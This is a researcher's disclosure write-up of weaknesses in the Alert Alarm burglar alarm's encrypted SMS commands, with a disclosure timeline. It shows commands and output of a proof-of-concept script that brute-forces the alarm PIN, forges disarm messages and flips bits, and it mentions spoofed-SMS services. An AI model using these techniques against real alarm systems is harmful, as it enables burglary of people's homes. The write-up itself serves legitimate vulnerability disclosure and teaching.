Alert Alarm SMS exploit - English version
#########################################

For Swedish translation of the article please go `here
<alert-alarm-exploit-se.html>`_.

tl;dr;
******
For less tech savvy people or people just bored about all the details, this
tl;dr; and the `summary`_ section at the end should be enough to read to get an
understanding of the issues.

- As of today, 2020-01-02, the issues presented here still haven't been fixed
  even though initial report date was July 3rd 2019.

- `Alert Alarm`_ is a Swedish company selling burglar alarms (with various
  possibilities for extensions) to home owners. At one of their pages [1_],
  they are saying that: "Our burglar alarms for home owners communicate using
  an encrypted channel primarily using GSM and secondarily using SMS".
  Apparently there is also some collaboration with `Verisure`_ since the people
  that I've been in contact with after reporting the issue to Alert Alarm are
  coming from Verisure.

- It all started out one morning in June 2019 when I noticed that when turning
  of the alarm from the App, a SMS was generated where the content was a long
  (hex-)string with random characters. After doing some reverse engineering I
  found out that Alert Alarm have multiple weaknesses in their SMS
  implementation that are used when turning on/off alarms from their Alert Alarm
  app (tested on Android). The weaknesses can be summaries in:

  - Crypto algorithm in use is plain AES-CBC which is `malleable`_.
  - No integrity protection of the encrypted messages.
  - Heavily reduced key space, from 128-bits to 9999 keys.
  - Doesn't use any device unique values/properties in the data being sent to
    the Alert Alarm server.
  - No key derivation function in use (KDF).
  - No key exchange protocol in use (like Diffie Hellman for example).

- This makes the security of the implementation very fragile, since all it
  takes for a rouge user is to get hold of a **single** SMS generated by the
  Alert Alarm app to be able to gain access to someones house. I.e., when the
  attacker got that he can easily figure out the code used to turn on/off the
  burglar alarm. Using free services one can send `spoofed SMS`_ with manually
  crafted data and then it's just to enter the victims house and no alarm will
  go off. Alternatively a thief can break into the house and just simply enter
  the code to turn off the alarm as the homeowner would do.

- On this page, one can find examples and a script that can decrypt Alert Alarm
  SMSes and also create valid Alert Alarm SMSes. The script is also capable of
  finding a key using a brute force attack and it's also possible to flip bits
  to change the original intention of the SMS.

Observation
***********
As mentioned, this caught my attention when I noticed that when turning off an
active alarm (``ARMED_HOME``) using the Android app, a SMS is created similar to
this (had to blur parts of it, otherwise anyone could figure out my own code by
just running the scripts presented here).

.. figure:: images/alert/aa_initial_sms.png
    :figclass: align-center
    :alt: SMS image

After spending the rest of the morning reverse engineering the app I could see
that the 64 bytes hex string is made up of two parts. The first part is the IV,
which is a random number (coming from ``SHA1PRNG``) and the second part is the
actual message.

.. code-block:: none

           32 bytes   32 bytes
        +-----------+----------+
        | IV        | Message  |
        +-----------+----------+

It uses a 128-bit key, however the key used for encryption are made up of
strings like this:

.. code-block:: none

        000000000000xxxx

Where "xxxx" is the pin code that is used to turn on and off the burglar alarm.
This means the key space is heavily reduced from 128-bits, to only 9999
combinations instead of 340282366920938463463374607431768211455 combinations as
it would have been if they had used a proper key!

The message it self is encrypted using plain `AES-CBC`_, so no integrity
protection or anything. What that means is that although the SMS is encrypted
anyone can still modify it without the receiver noticing that. I'll talk more
about that further down in the examples about flipping bits (see the section:
"Flip a bit in the encrypted message").

|

Message format
==============
The format of the decrypted message is as follows:

.. code-block:: none

        Bytes:            1   1   1      2       1     2        2        2         2          2   = 16 bytes
                +-----------+---+---+------+---------+-----+------+--------+---------+----------+
                |SMS Version| i | j | year | month-1 | day | hour | minute | user id | \x00\x00 |
                +-----------+---+---+------+---------+-----+------+--------+---------+----------+
                                              (hex)

Here "``i``" seems to represent the "`alarm off (0)`" and "`alarm on (1)`" and
"``j``" is probably whether it is "`armed home`" or "`armed away`".

|

Script
******
On my GitHub page, you'll find a Python script (`aaxploit.py`_) that I wrote as
a proof of concept script. With that script you can generate valid Alert Alarm
SMSes, brute force SMS to get the code to the burglar alarm and a couple of other
things that I'll go more into detail separately below. Calling the script with
no arguments lists all possible parameters. But to make it easier to follow
along, we've put together a couple of examples below.

|

Generate a SMS from scratch
===========================
This creates a valid SMS message (hex string), i.e, a real usable string that
can be sent as an SMS and that will either turn on or turn off the alarm. "-p"
here is the code that you want to use. If you own an Alert Alarm system, then
you can try this, put your own and known code after "-p" and use either "--on"
or "--off" to arm or disarm the alarm. Then take the crafted SMS and send it as
an SMS to +467190009972713.

.. code-block:: bash

        $ ./aaxploit.py -e -p 1234

.. _decrypt_sms:

Decrypt a SMS from the phone
============================
As an example, take the crafted SMS from the example above (having that said,
copy a SMS string from a phone, generated by the Alert Alarm app works just as
well). In this example we already know the pin code to turn on/off the alarm,
so we provide that as a parameter.

.. code-block:: bash

        $ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -d -p 1234

|

Brute force an encrypted SMS
============================
Here we pretend that we **don't** know the key (i.e., the pin code to turn
on/off the alarm), but we somehow have gotten hold of the encrypted SMS. By
running the brute force attack we try to find the correct key and pin to turn
on/off the alarm. Due to the nature of how the message is encoded, this always
seems to work and since the key space is very small, it finds the key/pin in
less than a second.

.. code-block:: bash

        $ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -b
        [INFO]: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
        [INFO]: Msg:              ee184c8e49d04a468eabd14aee04079b
        [INFO]: IV:               d244e98aed6f2dfbf991485e5e43cd56
        [INFO]: Key:              None (0000000000000000)

        [INFO]: Mode: bruteforce
        [INFO]: (Probably) found the correct ...
        [INFO]:    encryption key: 30303030303030303030303031323334
        [INFO]:    pin:            1234

As we can see, we found the correct key/pin code! Note that the pin code is the
same as used on the real physical burglar alarm at the alarm owners house. I.e.,
if a thief breaks in, he can enter this pin code and the alarm never goes off.

.. _flip_bits:

|

Flip a bit in the encrypted message
===================================
Since AES-CBC is malleable_, we can flip a bit in the IV which will be directly
reflected on the decrypted message. I.e., a man in the middle can use this to
either change a message from "Turn on alarm" to a "Turn off alarm" or vice
versa. Notice that here one doesn't even have to decrypt the message, i.e, by
just taking the original message and flip a bit and use the modified SMS is
enough to turn off (or turn on) the alarm. In the example below we flip the
meaning of the "``i``" bit.

.. code-block:: bash

        $ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b --flip 112 
        [INFO]: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
        [INFO]: Msg:              ee184c8e49d04a468eabd14aee04079b
        [INFO]: IV:               d244e98aed6f2dfbf991485e5e43cd56
        [INFO]: Key:              None (0000000000000000)

        [INFO]: Mode: flip bits
        [INFO]: Modified IV:      d245e98aed6f2dfbf991485e5e43cd56
        [INFO]: Modified SMS:     d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b


If we take the "Modified SMS" and decrypt it, we can see that the "i" field has
been changed (from "0" to "1", compare with message above, see the section
"Decrypt a SMS from the phone").

.. code-block:: bash

        $ ./aaxploit.py --input d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -d -p 1234
        [INFO]: Original SMS:     d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
        [INFO]: Msg:              ee184c8e49d04a468eabd14aee04079b
        [INFO]: IV:               d245e98aed6f2dfbf991485e5e43cd56
        [INFO]: Key:              30303030303030303030303031323334 (0000000000001234)

        [INFO]: Mode: decryption
        [INFO]: | sms_v | i | j | year | month | day | hour | minute | user_id |
        [INFO]:       2   1   1     19     0x6    03     08       48        01
                          /\
                          |----- changed from 0 to 1

Note that bit-flipping can be done to anything in the data, i.e., it would
probably work to trick the system by taking an old valid SMS created by the
Alert Alarm app and then just flip the date and/or hour bits and resend the
modified SMS.

|

Other attacks?
**************
- Is the Alert Alarm solution susceptible to `replay attacks`_? Is is possible
  to send the same message more than once?

  - No it's not, sending the same SMS twice makes the main control unit say
    "Fjärrkontroll, felkod 2". Also by adding for example +1 to minute still
    doesn't work. So, probably Alert Alarm on the server side are checking
    either a hash of all messages coming in and/or simply just check that the
    data in the SMS isn't too old.

- Will the Alert Alarm server detect brute force attacks. I.e., can one send
  9999 SMS in a short amount of time and thereby gain access to someones house?

  - I haven't got this confirmed, but it's certainly something one easily could
    try.

|

Open questions
**************
Why did Alert Alarm decide to use SMS from the app, when there already must be a
data connection with the app? This means that it probably works something like
this.

- The SMS is sent to the server.
- The server decrypts the SMS, checks the parameters, record the action
  and send out a request (using the data connection over GSM) to the home
  owners main unit controlling the alarm.
- When the alarm has been armed/disarmed, the Android app gets a
  notification of the updated status.

Why on earth use SMS at all? Doesn't all mobile phone / users have a data
connection in 2019?

.. summary_:

Contact with Alert Alarm / Verisure
***********************************
- **July 3rd 2019**: I'm reporting to the support page that I want to disclose a
  security issue.

- **July 9th 2019**: Using a private Facebook message to Alert Alarm I once
  again try to say that I have a security issue that I want to report.

- **July 10th 2019**:

  - Alert Alarm responds at Facebook that they've sent my contact details to the
    people developing the app.

  - Verisure's Information Security Manager try to contact me using first phone
    and then email.

  - I send over the report (basically this blog post) together with proof of
    concept scripts.

- **Augusti 12th 2019**: Phone meeting with Verisure, I get a status update and
  Verisure mentions that they need more time than standard 90-day disclosure
  time, something that I'm fine with.

- **October 2nd 2019**: I reach out to Verisure asking for an update. Message is that
  they are still working on a solution, testing "something" that should work and
  that they soon will let me know more about it. I also ask about CVE number and
  when we can go public with this. No answer to that.

- **November 4th 2019**: I reach out once again asking for an update.

- **November 7th 2019**: Verisure replies with more or less the same message as
  October 2nd. Again promises to get back to me soon.

- **2:nd January 2020**: I'm cleaning up the write-up and publish all this. The
  reason for doing it today is because today it's half a year ago since I
  initially reported the issues to Alert Alarm. If they would have been serious
  about this, it should all have been fixed by now and they should have
  reconnected better with me.

Summary
*******
The security of the solution relies on

1. the pin code and

2. the SMS senders phone number and

3. that no-one is able to get hold of the SMS sent.

In fact, one can argue that **the security only relies on "3"**, since if one
gets hold of "3", then it's trivial to figure out "1", that is basically what
the script `aaxploit.py`_ does. "2" on the other hand is typically available
in phone books etc, i.e., it's usually not hard to figure out the phone numbers
to the owner of a house.

Alert Alarm seems to have tried to "lock" the SMS service to a set of users.
i.e., the first user have to add additional phone numbers before these people
can use the app. So at first glance, one might believe that it's only the
owners of these phone numbers who can send the SMS. But the fact is that there
are many services out there that allow you to send `spoofed SMS`_ so it looks
like they were sent from a certain phone number. I.e., it's totally possible to
craft a SMS using `aaxploit.py`_ and then use one of these services to send a
rouge SMS. I.e., any user can turn off the alarm without the alarm owner knowing
about it.

**Should the owners of this alarm be worried?** Getting an SMS from the home
owner is probably a bit challenging, so it's probably a bit hard to actually do
the attack (don't leave your phone unattended!). On the other hand if Alert
Alarm **doesn't** notice brute force attacks on the receiving side of the SMS,
then it's fairly easy to put this attack into practice.

No matter, the flaws identified are quite severe and gives an attacker several
ways to attack the system. Attacks that shouldn't be possible to do that easy on
a system meant to protect our homes. Me and the other customers of Alert Alarm
don't want our burglar alarms to have these kind of weaknesses. Right now it's
more `Security by Obscurity`_ than real security.
